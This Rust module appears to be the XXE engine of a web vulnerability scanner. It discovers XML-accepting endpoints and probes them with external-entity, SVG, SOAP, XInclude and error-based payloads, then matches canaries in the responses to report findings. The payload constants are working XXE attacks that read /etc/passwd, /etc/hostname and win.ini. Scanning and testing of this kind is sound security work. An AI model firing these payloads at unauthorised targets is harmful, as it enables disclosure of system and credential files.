//! XXE Engine — XML surface discovery, in-band disclosure, error-based, alternate vectors.
//! MITRE: T1190 (Exploit Public-Facing Application).

use crate::engine_probes::{empty_ok, finding_with_probe_depth, http_client, normalize_url};
use crate::engine_result::{print_result, EngineResult};
use serde_json::{json, Value};
use std::time::Duration;

const XXE_PROBE_DEPTH: &str = "xxe_xml_surface";

fn xxe_finding(
    title: &str,
    severity: &str,
    description: &str,
    target: &str,
    extra: Value,
) -> Value {
    let mut f = finding_with_probe_depth(
        "xxe",
        title,
        severity,
        "T1190",
        description,
        target,
        XXE_PROBE_DEPTH,
    );
    if let Some(obj) = f.as_object_mut() {
        if let Some(map) = extra.as_object() {
            for (k, v) in map {
                obj.insert(k.clone(), v.clone());
            }
        }
    }
    f
}

async fn http_post_body(
    client: &reqwest::Client,
    url: &str,
    content_type: &str,
    body: &str,
) -> Option<crate::engine_probes::HttpProbe> {
    let resp = client
        .post(url)
        .header("Content-Type", content_type)
        .body(body.to_string())
        .timeout(Duration::from_secs(8))
        .send()
        .await
        .ok()?;
    let status = resp.status().as_u16();
    let final_url = resp.url().to_string();
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or_default().to_string()))
        .collect();
    let body_text = resp.text().await.unwrap_or_default();
    let body_text = if body_text.len() > 65_536 {
        body_text[..65_536].to_string()
    } else {
        body_text
    };
    Some(crate::engine_probes::HttpProbe {
        status,
        headers,
        body: body_text,
        final_url,
    })
}

const XXE_PASSWD: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#;
const XXE_HOSTNAME: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><r>&xxe;</r>"#;
const XXE_WININI: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>"#;
const XXE_ERROR: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "file:///nonexistent-wz-xxe-9137">%xxe;]><r/>"#;
const XXE_ENTITY_CAP: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "x"><!ENTITY b "&a;&a;&a;">]><r>&b;</r>"#;
const XXE_SVG: &str = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>"#;
const XXE_SOAP: &str = r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"#;
const XXE_XINCLUDE: &str = r#"<?xml version="1.0"?><r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></r>"#;

const PASSWD_CANARIES: &[&str] = &["root:x:0:0", "root:*:0:0", "/bin/bash", "/bin/sh", "daemon:"];
const HOSTNAME_CANARIES: &[&str] = &["localhost", ".local", ".internal"];
const WININI_CANARIES: &[&str] = &["[fonts]", "[extensions]", "for 16-bit app support"];
const ERROR_CANARIES: &[&str] = &["file:///", "system cannot find", "no such file", "failed to open", "entity", "external entity"];

const XML_PATHS: &[&str] = &[
    "/", "/api", "/api/v1", "/xml", "/upload", "/import", "/soap", "/service", "/ws",
    "/api/import", "/api/xml", "/api/upload", "/rpc", "/wsdl",
];

const CONTENT_TYPES: &[&str] = &[
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "image/svg+xml",
    "application/json",
];

fn file_disclosed(body: &str, canaries: &[&str], path_marker: &str) -> bool {
    canaries.iter().any(|c| body.contains(c)) && !body.contains(path_marker)
}

pub async fn run_xxe_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    for path in XML_PATHS {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        let ping = http_post_body(&client, &url, "application/xml", "<ping/>").await;
        let Some(ping) = ping else { continue };
        if ping.status == 415 || ping.status == 404 {
            continue;
        }

        findings.push(xxe_finding(
            "XML-processing endpoint discovered",
            "info",
            &format!(
                "Endpoint {} accepted XML probe (ping HTTP {} / {} B). External entity processing may be reachable.",
                url, ping.status, ping.body.len()
            ),
            target,
            json!({ "path": path }),
        ));

        let probes: &[(&str, &str, &[&str], &str, &str)] = &[
            (XXE_PASSWD, "critical", PASSWD_CANARIES, "/etc/passwd", "passwd-read"),
            (XXE_HOSTNAME, "critical", HOSTNAME_CANARIES, "/etc/hostname", "hostname-read"),
            (XXE_WININI, "critical", WININI_CANARIES, "win.ini", "winini-read"),
            (XXE_SVG, "high", HOSTNAME_CANARIES, "/etc/hostname", "svg-xxe"),
            (XXE_SOAP, "high", HOSTNAME_CANARIES, "/etc/hostname", "soap-xxe"),
            (XXE_XINCLUDE, "high", HOSTNAME_CANARIES, "/etc/hostname", "xinclude-read"),
        ];

        for (payload, sev, canaries, marker, label) in probes {
            for ct in CONTENT_TYPES {
                if let Some(xxe) = http_post_body(&client, &url, ct, payload).await {
                    if file_disclosed(&xxe.body, canaries, marker) {
                        findings.push(xxe_finding(
                            &format!("XXE: {} via {}", label, ct),
                            sev,
                            &format!(
                                "POST {} ({}) with {} payload returned file canary in response (HTTP {}).",
                                xxe.final_url, ct, label, xxe.status
                            ),
                            target,
                            json!({ "path": path, "content_type": ct, "vector": label }),
                        ));
                        break;
                    }
                }
            }
        }

        if let Some(err) = http_post_body(&client, &url, "application/xml", XXE_ERROR).await {
            let lc = err.body.to_ascii_lowercase();
            if ERROR_CANARIES.iter().any(|c| lc.contains(&c.to_ascii_lowercase()))
                && !err.body.contains("nonexistent-wz-xxe-9137")
            {
                findings.push(xxe_finding(
                    "XXE: error-based parser disclosure",
                    "high",
                    &format!(
                        "Error-based XXE probe at {} disclosed parser/file path details (HTTP {}).",
                        err.final_url, err.status
                    ),
                    target,
                    json!({ "path": path, "evidence": err.body.chars().take(200).collect::<String>() }),
                ));
            }
        }

        if let Some(cap) = http_post_body(&client, &url, "application/xml", XXE_ENTITY_CAP).await {
            if cap.body.contains("xxx") && !cap.body.contains("<!ENTITY") {
                findings.push(xxe_finding(
                    "XXE: internal entity expansion enabled",
                    "medium",
                    &format!(
                        "Bounded internal entity expansion was processed at {} (HTTP {}). External entities may also be enabled.",
                        cap.final_url, cap.status
                    ),
                    target,
                    json!({ "path": path }),
                ));
            }
        }

        if let Some(xxe) = http_post_body(&client, &url, "application/xml", XXE_PASSWD).await {
            let delta = (xxe.body.len() as i64 - ping.body.len() as i64).abs();
            if delta > 48
                && xxe.status != ping.status
                && !xxe.body.contains("<!ENTITY")
                && !xxe.body.contains("&xxe;")
            {
                findings.push(xxe_finding(
                    "XXE: differential response to entity probe",
                    "high",
                    &format!(
                        "XML endpoint {} changed response (ping HTTP {} / {} B → XXE HTTP {} / {} B) without echoing payload — blind XXE candidate. Pair with OAST engine for OOB confirmation.",
                        url, ping.status, ping.body.len(), xxe.status, xxe.body.len()
                    ),
                    target,
                    json!({ "path": path }),
                ));
            }
        }

        if findings.iter().any(|f| f.get("severity").and_then(|s| s.as_str()) == Some("critical")) {
            break;
        }
    }

    if findings.is_empty() {
        empty_ok("xxe", target)
    } else {
        let n = findings.len();
        EngineResult::ok(findings, format!("xxe: {} live finding(s)", n))
    }
}

pub async fn run_xxe(target: &str) {
    print_result(run_xxe_result(target).await);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn file_disclosed_detects_passwd() {
        assert!(file_disclosed("root:x:0:0:root", PASSWD_CANARIES, "/etc/passwd"));
        assert!(!file_disclosed("file:///etc/passwd", PASSWD_CANARIES, "/etc/passwd"));
    }
}
